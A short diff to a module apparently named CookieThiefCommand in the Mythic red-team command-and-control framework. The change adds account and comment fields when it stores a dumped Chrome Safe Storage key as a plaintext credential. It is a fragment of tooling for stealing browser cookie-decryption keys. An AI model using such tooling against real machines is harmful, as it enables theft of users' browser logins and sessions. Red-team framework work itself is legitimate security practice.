@@ -123,7 +123,7 @@ class CookieThiefCommand(CommandBase):
             print("Failed to delete dumped keys directory with error: " + str(e))
             sys.stdout.flush()
 
-        create_cred_resp = await MythicRPC().execute("create_credential", task_id=task.id,credential_type="plaintext",realm="local",credential=ccs_password,metadata="",comment=None)
+        create_cred_resp = await MythicRPC().execute("create_credential", task_id=task.id,credential_type="plaintext",account="Chrome Safe Storage",realm="local",credential=ccs_password,metadata="",comment="Chrome Safe Storage Key")
 
         ##DEBUG:
         print(str(create_cred_resp))
